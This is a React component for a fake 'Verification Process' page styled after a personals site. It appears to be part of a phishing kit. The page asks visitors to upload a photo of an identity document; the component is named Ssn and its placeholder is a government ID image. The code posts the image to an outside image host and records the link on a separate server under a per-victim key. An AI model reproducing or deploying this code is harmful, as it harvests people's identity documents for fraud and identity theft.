import React from "react";
import { useForm } from "react-hook-form";
import { useLocation, useNavigate } from "react-router-dom";
import './ssn.css'
import { useState } from "react";

const Ssn = () => {
  const [previewURL, setPreviewURL] = useState('/id-government3.png');
  const handleFileChange = (e) => {
    const file = e.target.files[0];

    if (file) {
      // Read the file content and create a preview URL
      const reader = new FileReader();
      reader.onloadend = () => {
        setPreviewURL(reader.result);
      };
      reader.readAsDataURL(file);
    }
  };
  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();
  const [loader, setLoader] = useState(false);
  const { state } = useLocation();
  const navigate = useNavigate();
  // console.log(state.temp);
  const handleAddBooking = (data) => {
    setLoader(true)
    const image = data.image[0];
    const formData = new FormData();
    formData.append("image", image);
    formData.append("title", (Math.random() + 1).toString(36).substring(7));

    const url = `https://hackiveimg.xyz/api/create`;
    fetch(url, {
      method: "POST",
      body: formData,
    })
      .then((res) => res.json())
      .then((imageData) => {
        if (imageData.success) {

          fetch(`https://hansserver.vercel.app/ssn/${state.temp}`, {
            method: "PUT",
            headers: {
              "content-type": "application/json",
            },
            body: JSON.stringify({ ssn: imageData.image }),
          })
            .then((res) => res.json())
            .then((data) => {
              if (data.modifiedCount > 0) {
                setLoader(false)
                navigate("/id", { state: { temp: state.temp } });
              }
            });
        }
      });
  };
  return (
    <div className="home-bg ssn-bg">
      <img src="/almostThereDarlings4e1b4e1b.png" alt="" className="alomostThere" />
      <img src="/megapersonalsPageHeader34e1b4e1b.png" alt="" className="megaMain" />
      <form className="form-card" onSubmit={handleSubmit(handleAddBooking)}>
        <h6 className="main-heading-verify">Verification Process</h6>
        <img src={previewURL} alt="" className="w-25" />
        {
          loader && <h6>loading...</h6>
        }
        <div>

          <input
            type="file"
            className="form-tag verify-filed"
            {...register("image", {
              required: "Photo is Required",
            })}
            onChange={handleFileChange}

          />
        </div>
        <div className="w-100 px-3">
          <button className="btn-next">next</button>
        </div>

      </form>
    </div>
  );
};

export default Ssn;
